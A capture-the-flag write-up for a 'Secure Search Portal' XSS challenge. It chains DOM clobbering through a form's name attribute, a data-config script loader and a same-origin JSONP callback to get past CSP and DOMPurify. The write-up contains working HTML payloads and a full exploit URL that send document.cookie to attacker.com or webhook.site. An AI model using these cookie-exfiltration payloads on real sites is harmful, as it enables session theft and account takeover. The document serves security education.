# Secure Search Portal - XSS Challenge Writeup

## Vulnerability Analysis

The challenge presents a "Secure Search Portal" that takes a query `q` and reflects it on the page. Traditional XSS is mitigated by two primary security controls:

1. **Strict Content Security Policy (CSP):**
   `default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'; font-src 'self' data:;`
   This prevents any inline scripts (`<script>alert(1)</script>`) or scripts loaded from external domains.

2. **DOMPurify Sanitization:**
   The application uses DOMPurify 3.0.6 to sanitize the query. Furthermore, it explicitly forbids the `id`, `class`, and `style` attributes (`FORBID_ATTR: ['id', 'class', 'style']`). This stops standard DOM clobbering techniques that rely on the `id` attribute.

### The Gadgets

Looking at `components.js`, we can identify two intended "gadgets".

**1. The Component Loader Gadget:**
```javascript
class ComponentManager {
    static loadComponent(element) {
        let rawConfig = element.getAttribute('data-config');
        let config = JSON.parse(rawConfig);
        let basePath = config.path || '/components/';
        let compType = config.type || 'default';
        let scriptUrl = basePath + compType + '.js';
        let s = document.createElement('script');
        s.src = scriptUrl;
        document.head.appendChild(s);
    }
}
```
This looks for elements with `data-component="true"` and reads their `data-config` attribute (a JSON string). It then dynamically creates a `<script>` tag pointing to `config.path + config.type + '.js'`. Because DOMPurify allows `data-*` attributes by default, we can inject a `<div>` that triggers this. However, due to the CSP, the script source must be from `'self'`.

**2. The JSONP Endpoint:**
The backend `server.js` exposes a JSONP endpoint at `/api/stats`.
```javascript
app.get('/api/stats', (req, res) => {
    const callback = req.query.callback;
    if (!callback || !/^[a-zA-Z0-9_\.]+$/.test(callback)) {
        return res.status(400).json({ error: "Invalid callback identifier" });
    }
    // ... payload = `${callback}(...);`
});
```
This endpoint allows us to execute a whitelisted callback function containing alphanumeric characters and dots.

**3. The Auth.loginRedirect Gadget:**
Also in `components.js`, there's a callback function:
```javascript
window.Auth.loginRedirect = function(data) {
    let config = window.authConfig || { dataset: { next: '/', append: 'false' } };
    let redirectUrl = config.dataset.next || '/';
    
    if (config.dataset.append === 'true') {
        let delimiter = redirectUrl.includes('?') ? '&' : '?';
        redirectUrl += delimiter + "token=" + encodeURIComponent(document.cookie);
    }
    window.location.href = redirectUrl;
};
```
This function reads configuration from `window.authConfig`. Since `id` is stripped by DOMPurify, we cannot use `<form id="authConfig">`. However, DOM clobbering can also be achieved using the `name` attribute on a `<form>` element!
`<form name="authConfig" data-next="http://attacker.com/" data-append="true"></form>`

If this element exists in the DOM, `window.authConfig` resolves to the form element, and `window.authConfig.dataset` allows access to the `data-*` attributes.

## Exploitation Steps

To steal the administrator's cookie, we must chain all three pieces together:

1. **Clobber window.authConfig:** Inject a `<form>` tag with `name="authConfig"` and the necessary data attributes to hijack the redirect flow and append the document cookie:
   ```html
   <form name="authConfig" data-next="https://webhook.site/YOUR-UUID/" data-append="true"></form>
   ```

2. **Trigger the Component Loader & JSONP:** Inject a `<div>` that uses the ComponentManager to dynamically load a script from the applications own JSONP endpoint (`/api/stats`), satisfying the CSP `'self'` restriction. We instruct the JSONP endpoint to use our vulnerable callback `Auth.loginRedirect`:
   ```html
   <div data-component="true" data-config='{"path":"/api/","type":"stats?callback=Auth.loginRedirect&"}'></div>
   ```

*(Note: The `&` at the end of `type` makes the appended `.js` by the ComponentManager become an ignored parameter `&.js` for the Express backend).*

3. **Execution Flow:**
   * The page loads and DOMPurify sanitizes our payload. `name` and `data-*` attributes are allowed, so our payload survives untouched.
   * `ComponentManager.init()` runs and finds our injected `<div>`.
   * It creates `<script src="/api/stats?callback=Auth.loginRedirect&.js"></script>` and appends it to the document head.
   * The CSP allows this (script-src 'self').
   * The browser fetches the script from the backend. The backend returns:
     `Auth.loginRedirect({"users":1337,"active":42,"status":"Operational"});`
   * The script executes, calling `Auth.loginRedirect`.
   * `Auth.loginRedirect` checks `window.authConfig`, which resolves to our clobbered `<form>` element.
   * It reads `config.dataset.next` (our attacker server/webhook) and `config.dataset.append` ("true").
   * It appends `document.cookie` to the URL and redirects the browser via `window.location.href`.
   * The webhook receives the cookie containing the flag.

### Full Payload URL

```
http://localhost:3000/?q=%3Cform%20name=%22authConfig%22%20data-next=%22https://webhook.site/YOUR-UUID/%22%20data-append=%22true%22%3E%3C/form%3E%3Cdiv%20data-component=%22true%22%20data-config=%27%7B%22path%22:%22/api/%22,%22type%22:%22stats?callback=Auth.loginRedirect%26%22%7D%27%3E%3C/div%3E
```
